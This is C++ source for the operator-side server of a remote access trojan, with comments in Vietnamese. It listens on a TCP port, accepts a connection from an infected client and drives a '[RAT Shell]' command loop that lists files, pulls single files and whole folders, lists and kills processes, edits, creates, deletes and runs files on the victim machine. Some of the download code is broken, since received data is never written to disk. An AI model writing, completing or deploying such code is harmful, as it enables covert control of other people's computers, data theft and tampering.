#include <iostream>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <fstream>
#include <string>
#include <windows.h>
#include <io.h>

#pragma comment(lib, "Ws2_32.lib")

const int BUFFER_SIZE = 4096;



class SocketClient {
public:
    SOCKET socket;
    void Send(const std::string&);
    std::string Receive();
    std::string ReceiveUntilTimeout(DWORD);
};

void SocketClient::Send(const std::string& msg){
    send(socket, msg.c_str(), static_cast<int>(msg.size()), 0);
}

std::string SocketClient::Receive() {
    char buffer[BUFFER_SIZE]{};

    int bytes = recv(socket, buffer, BUFFER_SIZE, 0);

    if(bytes <= 0)
        return "";

    return std::string(buffer, bytes);
}



class DownloadManager
{
public:
    SocketClient client;
    void ReceiveFile(const std::string& filename);
    void ReceiveFolder(const std::string& foldername);  
};

void DownloadManager::ReceiveFile(const std::string& filename) {
    auto response = client.Receive();
    
    if (response.rfind("ERROR", 0) == 0) {
        std::cout << "[-] Client bao loi: " << response << std::endl;
        return;
    }

    // --- XỬ LÝ CHUỖI THUẦN TÚY (KHÔNG DÙNG FILESYSTEM) ---
    // Tạo một bản sao tên file để biến đổi
    std::string safeFilename = filename; 
    
    // Thay thế tất cả các ký tự phân tách đường dẫn '/' hoặc '\' thành '_' 
    // để tránh lỗi cấu trúc thư mục trên Windows
    for (size_t i = 0; i < safeFilename.length(); ++i) {
        if (safeFilename[i] == '/' || safeFilename[i] == '\\' || safeFilename[i] == ':') {
            safeFilename[i] = '_';
        }
    }

    // Tạo thư mục downloads lưu trữ tập trung
    std::string targetDir = "downloads";
    CreateDirectoryA(targetDir.c_str(), NULL);
    
    // Đường dẫn file cuối cùng trên Windows (Ví dụ: "downloads\etc_passwd" hoặc "downloads\folder_sub_test.txt")
    std::string filepath = targetDir + "\\" + safeFilename;
    // -----------------------------------------------------

    std::ofstream file(filepath, std::ios::binary);
    if (!file.is_open()) {
        std::cout << "[-] Khong the tao file de ghi (Duong dan: " << filepath << ")\n";
        return;
    }

    std::cout << "[*] Dang tai file va luu thanh: " << safeFilename << "...\n";
    
    // Đặt timeout ngắn cho socket để nhận biết khi nào hết dữ liệu file
    DWORD timeout = 2000; 
    auto result = client.ReceiveUntilTimeout(timeout);

    file.close();
    std::cout << "[+] Tai file thanh cong! Luu tai: .\\" << targetDir << "\\" << safeFilename << std::endl;
}

void DownloadManager::ReceiveFolder(const std::string& foldername) {
    std::cout << "[*] Dang doi phan hoi tu Client..." << std::endl;
    auto response = client.Receive();

    if (response.rfind("ERROR", 0) == 0) {
        std::cout << "[-] Client bao loi: " << response << std::endl;
        return;
    }

    // Nếu nhận được tín hiệu START, tiến hành tải file
    if (response.rfind("START", 0) == 0) {
        std::string targetDir = "downloads";
        CreateDirectoryA(targetDir.c_str(), NULL);

        std::string archivePath = targetDir + "\\" + "temp_archive.tar.gz";

        std::ofstream file(archivePath, std::ios::binary);
        if (!file.is_open()) {
            std::cout << "[-] Khong the tao file ghi tren Server.\n";
            return;
        }

        std::cout << "[*] Dang tai tap tin nen cua folder (Timeout bat dau)...\n";
        
        // Cấu hình Timeout chặn treo cho Windows (2 giây)
        DWORD timeout = 2000; 
        auto result = client.ReceiveUntilTimeout(timeout);
        file.close();

        std::cout << "[+] Da nhan tron ven file .tar.gz. Dang tien hanh giai nen...\n";

        // Chạy lệnh giải nén tar trên Windows (Windows 10/11 tích hợp sẵn tar trong system32)
        std::string untarCmd = "tar -xzf \"" + archivePath + "\" -C \"" + targetDir + "\"";
        int res = system(untarCmd.c_str());

        // Xóa file nén tạm thời để dọn dẹp bộ nhớ
        DeleteFileA(archivePath.c_str());

        if (res == 0) {
            std::cout << "[+] Tai va giai nen folder thanh cong! Kiem tra thu muc: .\\" << targetDir << "\\" << foldername << std::endl;
        } else {
            std::cout << "[-] Loi giai nen. Ma loi he thong: " << res << "\n";
        }
    } else {
        std::cout << "[-] Khong nhan duoc tin hieu hop le tu client. Noi dung nhan: " << response << std::endl;
    }
}



class RatServer {
public:
    void Start();

    ~RatServer()
    {
        if(clientSocket != INVALID_SOCKET)
            closesocket(clientSocket);

        if(serverSocket != INVALID_SOCKET)
            closesocket(serverSocket);

        WSACleanup();
    }

private:
    SocketClient client;
    DownloadManager downloadManager;
    SOCKET serverSocket{};
    SOCKET clientSocket{};

    void InitWinsock();
    void WaitForClient();
    void CommandLoop();

    void HandleCommand(const std::string& input);
    
    void ListFile();
    void ListProcess();
    void ReceiveStatus();

    void SendFileContent(std::string& filename);

    void SysInfo();
};

void RatServer::Start() {
    InitWinsock();
    WaitForClient();
    CommandLoop();
}

void RatServer::InitWinsock() {
    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);

    serverSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    
    sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(8080);
    serverAddr.sin_addr.s_addr = INADDR_ANY;

    bind(serverSocket, (sockaddr*)&serverAddr, sizeof(serverAddr));
    listen(serverSocket, SOMAXCONN);

    std::cout << "[*] Server dang lang nghe tai cong 8080...\n";
}

void RatServer::WaitForClient() {
    client.socket = accept(serverSocket, nullptr, nullptr);
    downloadManager.client = client;
    std::cout << "[+] Co Client ket noi vao!\n";
}

void RatServer::CommandLoop() {
    std::string input;

    while (true) {
        std::cout << "\n[RAT Shell]> ";
        std::getline(std::cin, input);
        if (input.empty()) continue;
        if (input == "EXIT") break;
        
        // Gửi lệnh sang Client
        client.Send(input);

        HandleCommand(input);

    }
}

void RatServer::HandleCommand(const std::string& input) {
    char buffer[BUFFER_SIZE];

    if (input == "LIST") {
        ListFile();
    } 
    else if (input.rfind("GETFILE ", 0) == 0) {
        std::string filename = input.substr(8);
        downloadManager.ReceiveFile(filename); // Hàm nhận file lẻ cũ của bạn
    }
    else if (input.rfind("GETDIR ", 0) == 0) {
        std::string foldername = input.substr(7);
        downloadManager.ReceiveFolder(foldername); // Hàm nhận folder mới
    }
    else if (input == "PS") { // Xử lý nhận danh sách tiến trình
        ListProcess();
    }
    else if (input.rfind("KILL ", 0) == 0) { // Thêm nhánh xử lý phản hồi lệnh KILL
        ReceiveStatus();
    }
    else if (input.rfind("EDITFILE ", 0) == 0) { // Thêm nhánh xử lý EDITFILE
        std::string filename = input.substr(9);
        SendFileContent(filename);
    }
    else if (input.rfind("REMOVEFILE ", 0) == 0) { // Thêm nhánh xử lý phản hồi lệnh REMOVEFILE
        ReceiveStatus();
    }
    else if (input.rfind("RUNFILE ", 0) == 0) { // Thêm nhánh xử lý phản hồi lệnh RUNFILE
        ReceiveStatus();
    }
    else if (input.rfind("CREATEFILE ", 0) == 0) { // Thêm nhánh xử lý CREATEFILE
        std::string filename = input.substr(9);
        SendFileContent(filename);
    }
}

void RatServer::ListFile() {
    auto response = client.Receive();

    if(response.empty())
        return;

    std::cout << "\n--- Danh sach file cua Client ---\n";
    std::cout << response << std::endl;
}

void RatServer::ListProcess() {
    std::cout << "[*] Dang tai danh sach tien trinh..." << std::endl;
            
    // Đặt timeout ngắn (1 giây) để nhận biết khi Client dừng gửi dữ liệu
    DWORD timeout = 1000; 
    auto psResult = client.ReceiveUntilTimeout(timeout);
    
    if (!psResult.empty()) {
        std::cout << psResult << std::endl;
    } else {
        std::cout << "[-] Khong nhan duoc du lieu hoac thoi gian cho qua lau.\n";
    }
}

std::string SocketClient::ReceiveUntilTimeout(DWORD timeout) {
    setsockopt(socket, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout, sizeof(timeout));

    std::string result = "";
    while (true) {
        auto response = Receive();

        if(response.empty()) break;
        result += response;
    }

    // Reset lại timeout về vô hạn cho các lệnh tiếp theo
    timeout = 0;
    setsockopt(socket, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout, sizeof(timeout));

    return result;
}

void RatServer::SendFileContent(std::string& filename) {
    auto clientSignal = client.Receive();

    if(clientSignal.empty())
        return;

    if (clientSignal == "READY_FOR_CONTENT") {
        // Yêu cầu người dùng nhập nội dung mới trên Server
        std::cout << "[*] Nhap noi dung moi cho file (An Enter de gui): ";
        std::string newContent;
        std::getline(std::cin, newContent);

        // Gửi nội dung mới sang Client
        client.Send(newContent);

        // Nhận kết quả phản hồi cuối cùng từ Client
        auto response = client.Receive();

        if(response.empty())
            return;
        
        std::cout << "[*] Ket qua tu Client: " << response;
    } else {
        std::cout << "[-] Client khong san sang. Phan hoi: " << clientSignal << std::endl;
    }
}

void RatServer::ReceiveStatus() {
    auto response = client.Receive();

    if(response.empty())
        std::cout << "[-] Khong nhan duoc phan hoi tu Client.\n";
    else {
        std::cout << "[*] Ket qua tu Client: " << response;
    }
}



int main() {
    RatServer server;
    server.Start();
}